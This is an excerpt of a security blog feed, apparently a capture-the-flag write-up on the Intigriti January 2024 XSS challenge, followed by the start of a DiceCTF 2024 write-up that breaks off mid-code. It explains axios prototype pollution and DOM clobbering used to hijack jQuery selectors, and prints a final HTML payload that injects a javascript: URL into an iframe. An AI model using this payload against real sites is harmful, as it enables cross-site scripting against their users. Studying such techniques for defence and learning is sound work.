comment">// Attribute hooks are determined by the lowercase version</span><span class="token comment">// Grab necessary hook if one is defined</span><span class="token keyword">if</span> <span class="token punctuation">(</span> nType <span class="token operator">!==</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token operator">!</span>jQuery<span class="token punctuation">.</span><span class="token function">isXMLDoc</span><span class="token punctuation">(</span> elem <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    hooks <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>attrHooks<span class="token punctuation">[</span> name<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">]</span> <span class="token operator">||</span>        <span class="token punctuation">(</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">.</span>bool<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> name <span class="token punctuation">)</span> <span class="token operator">?</span> boolHook <span class="token operator">:</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> value <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        jQuery<span class="token punctuation">.</span><span class="token function">removeAttr</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> name <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> hooks <span class="token operator">&amp;&amp;</span> <span class="token string">"set"</span> <span class="token keyword">in</span> hooks <span class="token operator">&amp;&amp;</span>        <span class="token punctuation">(</span> ret <span class="token operator">=</span> hooks<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span> elem<span class="token punctuation">,</span> value<span class="token punctuation">,</span> name <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token keyword">undefined</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> ret<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    elem<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> value <span class="token operator">+</span> <span class="token string">""</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It first executes <code>hooks = jQuery.attrHooks[ name.toLowerCase() ]</code>, since we polluted the <code>onload</code> attribute, <code>jQuery.attrHooks[&#39;onload&#39;]</code> will be a string, making <code>hooks</code> a string as well.</p><p>Next, it reaches <code>&quot;set&quot; in hooks</code>, as strings do not have <code>in</code> to use, hence throwing the error seen earlier.</p><p>Now that we know where the problem lies, the solution is simple. Changing <code>onload</code> to <code>Onload</code> will suffice, as this way <code>name.toLowerCase()</code> will be <code>onload</code>, and <code>jQuery.attrHooks[&#39;onload&#39;]</code> will not exist.</p><p>With this, the issue is resolved. It was much easier than I had imagined, taking about 3-4 hours. Then, I saw the author’s <a href="https://twitter.com/kevin_mizu/status/1744552795410456756">tweet</a> and realized it was an unintended, explaining why it was less challenging than expected.</p><h2><span id="intended-solution-is-not-that-difficult-as-wellor-is-it">Intended solution is not that difficult as well…or is it?</span></h2><p>Knowing that my solution was unintended, I began to think about what the intended solution might be. The author mentioned in Discord that the intended solution and the current unintended solution used completely different approaches, so it could be assumed that the <code>attr(&#123;&#125;)</code> part was to be excluded, leaving only the remaining code:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">search</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/search"</span><span class="token punctuation">,</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#search"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token string-property property">"headers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.loading"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"hidden"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> repo <span class="token operator">=</span> d<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>repo<span class="token punctuation">.</span>owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"Not found!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#description"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>repo<span class="token punctuation">.</span>description<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Within the remaining code, my intuition told me that the focus was on this line:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"img.avatar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span> repo<span class="token punctuation">.</span>owner<span class="token punctuation">.</span>avatar_url<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>If we could use prototype pollution to change <code>$(&quot;img.avatar&quot;)</code> to <code>$(&#39;#homepage&#39;)</code>, selecting that iframe, and then with control over <code>repo.owner.avatar_url</code>, we could set the iframe’s src to <code>javascript:alert(1)</code>, achieving XSS.</p><p>This guess seemed very reasonable, with about a 90% chance of being correct, as using prototype pollution to affect selectors seemed new, at least to me, and it was cool! It also aligned with the author’s tweet: “super interesting.”</p><p>So, I spent some time exploring how selectors work, but the code turned out to be more complex than I had imagined, involving many functions.</p><p>After four to five hours, I finally found a point to exploit.</p><p>When executing <code>$()</code>, it uses <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L197">find</a> to locate the corresponding elements. There is a check for <code>documentIsHTML</code>, and if it is true, it typically uses native APIs like querySelector to search, with no room for manipulation.</p><p>Therefore, we needed to make it false. The code for this check is <a href="https://github.com/jquery/jquery/blob/3.7.1/src/core.js#L330">here</a>. By making <code>isXMLDoc</code> return true, <code>documentIsHTML</code> will be false:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">isXMLDoc</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span> <span class="token parameter">elem</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> namespace <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> elem<span class="token punctuation">.</span>namespaceURI<span class="token punctuation">,</span>        docElem <span class="token operator">=</span> elem <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> elem<span class="token punctuation">.</span>ownerDocument <span class="token operator">||</span> elem <span class="token punctuation">)</span><span class="token punctuation">.</span>documentElement<span class="token punctuation">;</span>    <span class="token comment">// Assume HTML when documentElement doesn't yet exist, such as inside</span>    <span class="token comment">// document fragments.</span>    <span class="token keyword">return</span> <span class="token operator">!</span>rhtmlSuffix<span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span> namespace <span class="token operator">||</span> docElem <span class="token operator">&amp;&amp;</span> docElem<span class="token punctuation">.</span>nodeName <span class="token operator">||</span> <span class="token string">"HTML"</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>We can use DOM clobbering to overwrite <code>documentElement</code>, turning <code>docElem</code> into an <code>&lt;img&gt;</code>. This change would invalidate the check and set <code>isXMLDoc</code> to true because <code>documentElement</code> is not <code>&lt;html&gt;</code>.</p><p>After bypassing the check, native APIs were temporarily not used, and the <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L2001">select</a> function was executed, starting with tokenizing the selector:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> parseOnly</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> matched<span class="token punctuation">,</span> match<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> type<span class="token punctuation">,</span>        soFar<span class="token punctuation">,</span> groups<span class="token punctuation">,</span> preFilters<span class="token punctuation">,</span>        cached <span class="token operator">=</span> tokenCache<span class="token punctuation">[</span> selector <span class="token operator">+</span> <span class="token string">" "</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> cached <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> parseOnly <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> cached<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This seemed to be the target!</p><p>By polluting <code>img.avatar </code>, we could control the <code>tokenCache</code> content, influencing the tokenization result to directly replace it with the iframe we wanted to select.</p><p>It appears the expected solution wasn’t that difficult after all.</p><p>However, after attempting it, it was found to be ineffective.</p><p>The reason it didn’t work was not due to a wrong gadget but rather the prototype pollution aspect. This led to revisiting and studying the axios vulnerability exploit that was previously overlooked.</p><p>Axios works like this when converting the form name to a JSON key, as shown <a href="https://github.com/axios/axios/blob/v1.6.4/lib/helpers/formDataToJSON.js#L12">here</a>:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/** * It takes a string like `foo[x][y][z]` and returns an array like `['foo', 'x', 'y', 'z'] * * @param &#123;string&#125; name - The name of the property to get. * * @returns An array of strings. */</span><span class="token keyword">function</span> <span class="token function">parsePropPath</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// foo[x][y][z]</span>  <span class="token comment">// foo.x.y.z</span>  <span class="token comment">// foo-x-y-z</span>  <span class="token comment">// foo x y z</span>  <span class="token keyword">return</span> utils<span class="token punctuation">.</span><span class="token function">matchAll</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\w+|\[(\w*)]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">match</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'[]'</span> <span class="token operator">?</span> <span class="token string">''</span> <span class="token operator">:</span> match<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> match<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>It treats any characters other than A-Za-z0-9_ as separators, so spaces cannot be part of the property name. I spent three to four hours here and couldn’t find any way to bypass this.</p><p>At this point, I realized I was wrong, this challenge was not that simple…</p><h2><span id="one-of-the-three-most-common-illusions-i-can-solve-it">One of the three most common illusions: I can solve It</span></h2><p>After a day, I continued to look at this challenge. Since I couldn’t use spaces, there must be another way to exploit it. So, I continued to trace how the code works.</p><p>If you keep tracing down, you will reach the function <a href="https://github.com/jquery/jquery/blob/3.7.1/src/selector.js#L1766">matcherFromTokens</a>. However, the code inside is complex and lengthy. When I first saw it, I thought, “Forget it, I’ll wait for the solution.”</p><p>But after a day, I gathered my spirits and started over. I found a place to pollute before entering tokenize:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">select</span><span class="token punctuation">(</span> <span class="token parameter">selector<span class="token punctuation">,</span> context<span class="token punctuation">,</span> results<span class="token punctuation">,</span> seed</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> i<span class="token punctuation">,</span> tokens<span class="token punctuation">,</span> token<span class="token punctuation">,</span> type<span class="token punctuation">,</span> find<span class="token punctuation">,</span>    compiled <span class="token operator">=</span> <span class="token keyword">typeof</span> selector <span class="token operator">===</span> <span class="token string">"function"</span> <span class="token operator">&amp;&amp;</span> selector<span class="token punctuation">,</span>    match <span class="token operator">=</span> <span class="token operator">!</span>seed <span class="token operator">&amp;&amp;</span> <span class="token function">tokenize</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> selector <span class="token operator">=</span> compiled<span class="token punctuation">.</span>selector <span class="token operator">||</span> selector <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Here, there is <code>selector = compiled.selector || selector</code>. So, if I pollute <code>selector</code>, I can change the selector arbitrarily.</p><p>Just as I was feeling proud of my cleverness, reality came crashing down on me. After polluting the selector, an error occurred when entering tokenize because this part:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// Filters</span><span class="token keyword">for</span> <span class="token punctuation">(</span> type <span class="token keyword">in</span> filterMatchExpr <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span> match <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>expr<span class="token punctuation">.</span>match<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span> soFar <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span> <span class="token operator">!</span>preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span> <span class="token operator">||</span>        <span class="token punctuation">(</span> match <span class="token operator">=</span> preFilters<span class="token punctuation">[</span> type <span class="token punctuation">]</span><span class="token punctuation">(</span> match <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        matched <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tokens<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">value</span><span class="token operator">:</span> matched<span class="token punctuation">,</span>            <span class="token literal-property property">type</span><span class="token operator">:</span> type<span class="token punctuation">,</span>            <span class="token literal-property property">matches</span><span class="token operator">:</span> match        <span class="token punctuation">&#125;</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        soFar <span class="token operator">=</span> soFar<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span> matched<span class="token punctuation">.</span>length <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By polluting the selector, when executing <code>type in filterMatchExpr</code>, the polluted selector will be retrieved. Then, it proceeds to <code>jQuery.expr.match[type].exec</code>, which causes an error because a string does not have the <code>exec</code> method.</p><p>In other words, no matter what we pollute, once we enter tokenize, an error will occur. Therefore, trying to directly pollute the selector as an iframe is not possible.</p><p>However, we can pollute the selector with something already in the cache, such as <code>img.loading</code>, to bypass the error in tokenize.</p><p>But this only prevents the program from breaking, it still doesn’t solve the challenge.</p><h2><span id="hint-to-the-rescue">Hint to the rescue</span></h2><p>After another day or two, I saw the author’s <a href="https://twitter.com/kevin_mizu/status/1749740885657755842">hint</a> on Twitter, clearly pointing out that the key was the <code>addCombinator</code> I had previously overlooked due to its complexity. From the hint, it was evident that I was just one step away.</p><p>So, I gritted my teeth for about half a day, traced this part of the code a bit, and finally got the expected answer.</p><p>Here is the final payload:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>documentElement</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>search<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.owner.avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javascript:alert(document.domain)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.CLASS.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.TAG.a<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.dir<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>parentNode<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>__proto__.selector<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>img.loading<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>In fact, the last part with <code>addCombinator</code> was a bit of a guess and a bit of actual knowledge. It’s like a part where <code>dir</code> is used to find matching elements, setting it as the parentNode will keep searching upwards, eventually matching the entire HTML element. This will add <code>src</code> to every element, including iframes.</p><p>I’ve forgotten the details of each function because it was quite complex. If you’re interested, you can directly read the original author’s writeup (link provided below).</p><h2><span id="afterword">Afterword</span></h2><p>I really enjoyed the gradual progression of this challenge, from initially finding an unintended solution and thinking it was simple, to finding the first cache location and thinking I had solved it, only to realize that axios’s prototype pollution couldn’t be used. Then, finding the second <code>compiled.selector</code> and thinking it was over, only to discover it wasn’t.</p><p>To keep digging deeper until reaching <code>addCombinator</code> to confirm that this challenge could indeed be solved, experiencing so many emotional ups and downs within a single challenge indicates that the challenge was well-designed. Another aspect I liked was that it forced you to review the code; without looking at the code, it was impossible to solve. I enjoy code reviews, so I really liked this challenge.</p><p>I admire the author’s ability to continue exploring deeper and find this very interesting solution, combining DOM clobbering and prototype pollution, modifying the jQuery selector’s reference, and creating such a fun challenge!</p><p>I recommend the author’s writeup, which goes through a similar process as mine: <a href="https://mizu.re/post/intigriti-january-2024-xss-challenge">Intigriti January 2024 - XSS Challenge</a></p><p>In addition, another unintended solution found by @joaxcar is also interesting. If you are interested, you can take a look at: <a href="https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge/">Hunting for Prototype Pollution gadgets in jQuery (intigriti 0124 challenge)</a></p><p>If you are interested in the original topic, you can also refer to it here: <a href="https://bugology.intigriti.io/intigriti-monthly-challenges/0124">https://bugology.intigriti.io/intigriti-monthly-challenges/0124</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Last month’s (January 2024) Intigriti challenge was very interesting, made by &lt;a href=&quot;https://twitter.com/kevin_mizu&quot;&gt;@kevin_mizu&lt;/a&gt;. I have often seen him post client-side related challenges on Twitter before, and this time the quality of the challenge was as good as ever, worth documenting.&lt;/p&gt;
&lt;p&gt;The challenge link is here, if you haven’t seen it yet, you can take a look: &lt;a href=&quot;https://challenge-0124.intigriti.io/&quot;&gt;https://challenge-0124.intigriti.io/&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>DiceCTF 2024 Writeup</title>
    <link href="https://blog.huli.tw/2024/02/12/en/dicectf-2024-writeup/"/>
    <id>https://blog.huli.tw/2024/02/12/en/dicectf-2024-writeup/</id>
    <published>2024-02-12T04:40:00.000Z</published>
    <updated>2024-02-12T06:43:18.460Z</updated>
    
    <content type="html"><![CDATA[<p>Compared to <a href="https://blog.huli.tw/2023/03/26/en/dicectf-2023-writeup/">last year</a> and <a href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/">the year before</a>, the difficulty of this year’s web challenges has significantly decreased, making them more approachable and beginner-friendly(It’s good to have both easy and difficult challenges). With the effort of my teammates, we managed to secure the first place, leaving only one web challenge unsolved.</p><p>This time, I only managed to solve the simple “funnylogin” and the challenging “safestlist” challenges. The rest were solved by my teammates. I also took a look at another challenge called “another-csp”. Therefore, this post will only cover the challenges I reviewed and the more difficult ones.</p><p>If you want to see other challenges, you can refer to other people’s writeups:</p><ol><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003">st98 - DiceCTF 2024 Quals writeup</a></li><li><a href="https://one3147.tistory.com/77">0xOne - 2024 Dice CTF Write up [Web]</a></li></ol><p>All challenge source code provided by the organizers can be found at: <a href="https://github.com/dicegang/dicectf-quals-2024-challenges">https://github.com/dicegang/dicectf-quals-2024-challenges</a></p><p>Keyword list:</p><ol><li>crash chromium</li><li>slower css style</li><li>xsleak</li><li>URL length limit</li><li>service worker</li><li>background fetch</li><li>connection pool + css injection</li><li>iframe width + css injection</li></ol><span id="more"></span><h2><span id="webx2fanother-csp-16-solves">web&#x2F;another-csp (16 solves)</span></h2><p>The code for this challenge is quite simple, and after simplification, it looks like this:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>another-csp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sandbox<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sandbox<span class="token punctuation">"</span></span> <span class="token attr-name">sandbox</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">  document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">onsubmit</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> code <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'code'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>    <span class="token keyword">const</span> token <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'token'</span><span 